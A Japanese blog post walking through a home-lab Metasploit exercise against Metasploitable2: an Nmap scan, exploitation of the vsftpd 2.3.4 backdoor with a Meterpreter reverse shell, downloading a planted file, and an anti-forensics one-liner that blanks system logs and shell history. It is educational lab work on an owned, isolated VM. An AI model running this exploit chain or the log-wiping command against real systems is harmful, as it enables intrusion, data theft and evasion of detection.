---
title: "ハッキングゲームがきっかけでMetasploitに入門してみた"
date: 2026-09-15
tags: ["vulnerability", "エシカルハッキング", "metasploit", "exploit", "Nmap", "ゲーム"]
source: "https://qiita.com/ohtsuka-shota/items/84bfbc28f549fc61b062"
---
# はじめに
HACKHUBというPCゲーをやっていたりします。
ゲームとは思えないほどリアルな操作感でビックリしており、エシカルハッキングの教材としても使えるのではないかと思うほどです。
※とは言いつつ、コマンドのオプションがゲームの要素に関係無いと殆ど使えない等ありますが、それは仕方ないと思います。

https://store.steampowered.com/app/2980270/HackHub__Ultimate_Hacker_Simulator/?l=japanese

このゲームでMetasploitで侵入対象のサーバの脆弱性をついてリモートログインをするみたいなものがあり、実際はどんな感じなのかという事を確認するため、Proxmoxで作っているホームラボ上で簡単に確認してみようと思います。

:::note warn
警告
本記事の内容は自宅ラボ内の隔離環境で、自分が所有・管理するMetasploitable2に対してのみ実施しています。
他人が管理するサーバやネットワークに対して同様の行為を行うことは不正アクセス禁止法などの法律に違反する可能性があります。本記事は学習・検証目的の共有であり、悪用を推奨するものではありません。
:::

## サイバーキルチェーンで見る本記事の位置づけ

今回の内容をサイバーキルチェーンの7段階に当てはめると、以下のように整理できます。

| 段階 | 内容 | 本記事での該当箇所 |
|---|---|---|
| ①偵察 | 標的の情報収集 | Nmapによるポートスキャン・稼働サービスの特定 |
| ④エクスプロイト | 脆弱性攻撃 | vsftpd 2.3.4に仕込まれた既知バックドアの悪用 |
| ⑤インストール | バックドア設置 | Meterpreterペイロードの設置 |
| ⑥C2/遠隔操作 | サーバーとの通信 | Meterpreterシェルによる遠隔操作・ファイル操作 |
| ⑦目的の実行 | データ窃取や被害 | ログ削除による痕跡隠蔽 |

![ハッキングの全体フロー図.jpeg](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/7802ec5a-b298-4b6b-898d-26ac927b4a6c.jpeg)


# Metasploitとは
ペネトレーションテスト（侵入テスト）用のオープンソースフレームワーク。
セキュリティの脆弱性を発見・検証するためのツール集です。

https://www.metasploit.com/


# 環境構築
## 攻撃対象想定のVM用意
Metasploitable VMはここからダウンロードすることが出来ます。

https://sourceforge.net/projects/metasploitable/

PVEのシェルからVMデプロイに必要なものをインストールして、立ち上げていきます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/cfbb054d-f4c4-4656-9e3d-89136ff17482.png)

上記サイトからzipファイルをダウンロードしたり解凍したりします。
```
root@pve:~# wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
root@pve:~# apt install unzip -y
root@pve:~# unzip metasploitable-linux-2.0.0.zip 
root@pve:~# cd Metasploitable2-Linux/
```

```
root@pve:~/Metasploitable2-Linux# qm create 200 --name metasploitable2 --memory 512 --cores 1 --net0 virtio,bridge=vmbr0
root@pve:~/Metasploitable2-Linux# qm importdisk 200 Metasploitable.vmdk local
root@pve:~/Metasploitable2-Linux# qm set 200 --scsi0 local:200/vm-200-disk-0.raw
root@pve:~/Metasploitable2-Linux# qm set 200 --boot order=scsi0
root@pve:~/Metasploitable2-Linux# qm start 200
```

起動出来ました。
ユーザパスはmsfadmin/msfadminみたいです。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/0e6267a1-3a9f-493b-9c19-acc74dd0a4da.png)

## kaliからMetasploitを使って攻撃対象に侵入する
nmap （攻撃対象のサーバIP） -sVを実行して開いているポートやバージョンを確認します。
めちゃくちゃ開いてますね。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/3537ef9f-8966-4aaf-95f9-500ee630ca4c.png)

```
# nmap 192.168.0.27 -sV      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 17:28 +0900
Nmap scan report for 192.168.0.27
Host is up (0.00013s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: BC:24:11:5B:51:4E (Proxmox Server Solutions GmbH)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.91 seconds
```

metasploit-frameworkを起動します。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/ba329ff9-20d6-4dc6-aa36-dee84f2668ab.png)

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/b2689d08-9830-423f-a58d-aeec9a50b218.png)

searchコマンドを使用して、脆弱性をついたモジュールを探します。
今回は"exploit/unix/ftp/vsftpd_234_backdoor"というモジュールを使っていきます。
use 番号というコマンドを実行することでそのモジュールを使う事を宣言できます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/8988d322-4735-4be9-afa9-1bb4dd4cf366.png)

```
msf > search ftp type:exploit backdoor

Matching Modules
================

   #  Full Name                               Disclosure Date  Rank       Check  Name
   -  ---------                               ---------------  ----       -----  ----
   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  Yes    ProFTPD 1.3.3c Backdoor Command Execution
   1  exploit/unix/ftp/vsftpd_234_backdoor    2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution                                                                                                              
                                                                                                                   
                                                                                                                   
Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor     
                                                                                                                   
msf > use 1
[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp    
```

モジュール（exploit/unix/ftp/vsftpd_234_backdoor）のそれぞれの項目の意味については以下となります。
| 部分 | この例の値 | 意味 |
|------|-----------|------|
| **種類** | `exploit` | 侵入・コード実行が可能（他に`auxiliary`=情報収集、`post`=侵入後の操作） |
| **対応OS** | `unix` | Unix系OS対応（Linux、BSD、Solarisなど）（他に`linux`, `windows`, `multi`など） |
| **攻撃方法** | `ftp` | FTPサーバー経由の攻撃（他に`http`, `ssh`, `smb`など） |
| **脆弱性名** | `vsftpd_234_backdoor` | vsftpd 2.3.4に仕込まれたバックドアを悪用 |

ちなみに、モジュールは/usr/share/metasploit-framework/modules/にあるようです。
今回の場合は以下。
```
# pwd
/usr/share/metasploit-framework/modules/exploits/unix/ftp

# ls -ltr
合計 20
-rw-r--r-- 1 root root 6876  8月 27 20:02 vsftpd_234_backdoor.rb
-rw-r--r-- 1 root root 5993  8月 27 20:02 proftpd_modcopy_exec.rb
-rw-r--r-- 1 root root 3504  8月 27 20:02 proftpd_133c_backdoor.rb
```

使用するモジュールを宣言した後、攻撃に使用する設定値を入力していきます。
show optionsで何を入力するかをざっくり確認できそうです。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/ab2b661f-9400-4b87-b2bf-147482ed289f.png)

```
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                      sics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   EXTENSIONS                       no        Comma-separate list of extensions to load
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, GET, TFTP, TNFTP, WGE
                                              T)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous hand
                                              les, requires Linux ≥3.17 (for Python variant also Python ≥3.8, test
                                              ed shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-sear
                                              ch, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST                            yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly
                                           to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      cfuUCUCJQiD      no        Name to use on remote system when storing payload; cannot contai
                                                  n spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Linux/Unix Command



View the full module info with the info, or info -d command.
```

RHOSTS及びLHOSTというモジュールオプションにIPアドレスを設定していきます。
set RHOSTS及びLHOSTコマンド実行後、改めてshow optionsを見てみると、設定したIPアドレスが表示されいていることがわかります。
```
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.0.27
RHOST => 192.168.0.27
msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.0.25
LHOST => 192.168.0.25

msf exploit(unix/ftp/vsftpd_234_backdoor) > show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.0.27     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                      sics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   EXTENSIONS                       no        Comma-separate list of extensions to load
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, GET, TFTP, TNFTP, WGE
                                              T)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous hand
                                              les, requires Linux ≥3.17 (for Python variant also Python ≥3.8, test
                                              ed shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-sear
                                              ch, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           192.168.0.25     yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port


省略
```

この状態でexploitコマンドを実行していきます。
成功するとバックドアから侵入できます。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/9ff6e4d5-008e-44dc-bad0-4ff12f45326e.png)
```
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.0.25:4444 
[*] 192.168.0.27:21 - Running automatic check ("set AutoCheck false" to disable)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.35/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.0.27:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.0.27:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] 192.168.0.27:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.0.25:4444 -> 192.168.0.27:56111) at 2026-09-15 18:01:03 +0900

meterpreter > 
```

helpコマンドを実行すると、どんなコマンドが実行できるのか確認出来るので、便利そうです。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/c7743ec6-3aa6-4c93-935d-be49f12d0e79.png)

sysinfoを実行すると侵入したシステムのOS情報などを取得できます。
```
meterpreter > sysinfo 
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

また、downloadコマンドもあるので、侵入先の大切なデータを持ち出すことも可能です。
試しに、攻撃対象に事前に仕込んだsecret.txtをダウンロードしてみます。
```
eterpreter > cd /home/msfadmin/
meterpreter > ls
Listing: /home/msfadmin
=======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2010-03-17 08:01:07 +0900  .bash_history
040755/rwxr-xr-x  4096  dir   2010-04-18 03:11:00 +0900  .distcc
100600/rw-------  4174  fil   2012-05-14 15:01:49 +0900  .mysql_history
100644/rw-r--r--  586   fil   2010-03-17 08:12:59 +0900  .profile
100700/rwx------  4     fil   2012-05-21 03:22:32 +0900  .rhosts
040700/rwx------  4096  dir   2010-05-18 10:43:18 +0900  .ssh
100644/rw-r--r--  0     fil   2010-05-08 03:38:35 +0900  .sudo_as_admin_successful
100644/rw-r--r--  0     fil   2026-09-15 18:12:55 +0900  secret.txt
040755/rwxr-xr-x  4096  dir   2010-04-28 12:44:17 +0900  vulnerable

meterpreter > download secret.txt 
[*] Downloading: secret.txt -> /home/test/secret.txt
[*] Completed  : secret.txt -> /home/test/secret.txt
```
ダウンロードできていますね。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/2d1d3b21-fe90-4949-8dca-c484320bdbad.png)

HACKHUBだとexplorerというコマンドがあって、それを実行すると侵入先のファイルなどをexplorerで操作できたのですが、実際のmetasploitにはこのコマンドは無いようです。
もしexplorerで操作する場合は以下のようにpythonでwebサーバを立ち上げてwebブラウザから操作するとそれっぽくなるようです。（やってみた感じちょっと微妙そうですが。。。）
```
meterpreter > shell
Process 5716 created.
Channel 2 created.
python -m SimpleHTTPServer 8888 &
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/4ee4c1b1-95c0-4384-9b58-4ba744191845.png)

## 攻撃対象にどういう痕跡が残るのか確認とアンチ・フォレンジック
metasploitから侵入するとログに痕跡が残ります。（他の方法でも残ると思いますが。）
例えば、今回192.168.0.25から攻撃対象に侵入しているのですが、思いっきりilligal portとか書いてて不穏です。

auth.log
```
Sep 15 04:22:43 metasploitable sshd[4853]: Server listening on :: port 22.
Sep 15 04:22:43 metasploitable sshd[4853]: error: Bind to port 22 on 0.0.0.0 failed: Address already in use.
Sep 15 04:25:41 metasploitable login[5378]: pam_unix(login:session): session opened for user msfadmin by LOGIN(uid=0)
Sep 15 04:28:20 metasploitable sshd[5492]: Did not receive identification string from 192.168.0.25
Sep 15 04:28:21 metasploitable rshd[5501]: Connection from 192.168.0.25 on illegal port
Sep 15 04:28:26 metasploitable rlogind[5502]: Connection from 192.168.0.25 on illegal port
Sep 15 04:28:27 metasploitable rlogind[5521]: Connection from 192.168.0.25 on illegal port
Sep 15 04:28:27 metasploitable rlogind[5532]: Connection from 192.168.0.25 on illegal port
Sep 15 04:28:32 metasploitable rshd[5534]: Connection from 192.168.0.25 on illegal port
Sep 15 04:34:50 metasploitable sshd[5552]: Did not receive identification string from 192.168.0.25
Sep 15 04:34:50 metasploitable rshd[5561]: Connection from 192.168.0.25 on illegal port
Sep 15 04:34:56 metasploitable rlogind[5562]: Connection from 192.168.0.25 on illegal port
Sep 15 04:34:56 metasploitable rlogind[5578]: Connection from 192.168.0.25 on illegal port
Sep 15 04:34:56 metasploitable rlogind[5589]: Connection from 192.168.0.25 on illegal port
Sep 15 04:35:01 metasploitable rshd[5591]: Connection from 192.168.0.25 on illegal port
Sep 15 04:39:01 metasploitable CRON[5603]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 15 04:39:01 metasploitable CRON[5603]: pam_unix(cron:session): session closed for user root
Sep 15 05:02:01 metasploitable CRON[5667]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 15 05:02:01 metasploitable CRON[5667]: pam_unix(cron:session): session closed for user root
Sep 15 05:09:01 metasploitable CRON[5684]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 15 05:09:01 metasploitable CRON[5684]: pam_unix(cron:session): session closed for user root
Sep 15 05:17:01 metasploitable CRON[5711]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 15 05:17:01 metasploitable CRON[5711]: pam_unix(cron:session): session closed for user root
```

syslog
```
Sep 15 04:34:56 metasploitable jsvc.exec[5322]: 15-Sep-26 4:34:56 AM org.apache.jk.common.MsgAjp processHeader SEVERE: BAD packet signature 32926 
Sep 15 04:34:56 metasploitable in.rlogind[5578]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5580]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5581]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5582]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5583]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5584]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5585]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5586]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5587]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5588]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:34:56 metasploitable in.rlogind[5589]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:35:01 metasploitable jsvc.exec[5322]: 15-Sep-26 4:35:01 AM org.apache.jk.common.ChannelSocket receive WARNING: can't read body, waited #259 15-Sep-26 4:35:01 AM org.apache.jk.common.ChannelSocket processConnection WARNING: Closing ajp connection -1 
Sep 15 04:35:01 metasploitable jsvc.exec[5322]: 15-Sep-26 4:35:01 AM org.apache.jk.common.MsgAjp processHeader SEVERE: BAD packet signature 18245 15-Sep-26 4:35:01 AM org.apache.jk.common.ChannelSocket processConnection SEVERE: Error, processing connection java.lang.IndexOutOfBoundsException    at java.io.BufferedInputStream.read(libgcj.so.81)    at org.apache.jk.common.ChannelSocket.read(ChannelSocket.java:626)    at org.apache.jk.common.ChannelSocket.receive(ChannelSocket.java:583)    at org.apache.jk.common.ChannelSocket.processConnection(ChannelSocket.java:691)    at org.apache.jk.common.ChannelSocket$SocketConnection.runIt(ChannelSocket.java:895)    at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.run(ThreadPool.java:689)    at java.lang.Thread.run(libgcj.so.81) 
Sep 15 04:35:01 metasploitable in.rshd[5591]: connect from 192.168.0.25 (192.168.0.25)
Sep 15 04:38:10 metasploitable postfix/anvil[5573]: statistics: max connection rate 1/60s for (smtp:192.168.0.25) at Sep 15 04:34:50
Sep 15 04:38:10 metasploitable postfix/anvil[5573]: statistics: max connection count 1 for (smtp:192.168.0.25) at Sep 15 04:34:50
Sep 15 04:38:10 metasploitable postfix/anvil[5573]: statistics: max cache size 1 at Sep 15 04:34:50
Sep 15 04:39:01 metasploitable /USR/SBIN/CRON[5604]: (root) CMD (  [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -r -0 rm)
Sep 15 05:02:01 metasploitable /USR/SBIN/CRON[5668]: (root) CMD (if [ -x /usr/sbin/pg_maintenance ]; then /usr/sbin/pg_maintenance --analyze >/dev/null; fi)
Sep 15 05:09:01 metasploitable /USR/SBIN/CRON[5685]: (root) CMD (  [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -r -0 rm)
Sep 15 05:17:01 metasploitable /USR/SBIN/CRON[5712]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
```

このためにログを削除するなどの対応を攻撃者は行うはずですが、そのためにはまず権限昇格をしないといけません。
getuidを実行すると現在どのユーザで侵入しているのかを確認できます。rootと出力されていることからMetasploitable VMはかなり脆弱であると言えますね汗
```
meterpreter > getuid
Server username: root
```

ログを削除していきます。
今回の場合logを全部削除するので、侵入されたというのは即バレするような気がします。
追跡は難しくなるとは思いますが。
```
meterpreter > shell
Process 5776 created.
Channel 5 created.
cd /var/log && for log in auth.log syslog vsftpd.log wtmp btmp lastlog; do echo "" > $log 2>/dev/null; done && echo "" > ~/.bash_history && history -c
exit
```
消えていることがわかります。
このように侵入した痕跡を消すことが出来るので、SIEM等の導入は万が一の時の為にもしておいた方が良さそうですね。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/435f7c84-0543-4fc6-9e99-425d7df5eedf.png)


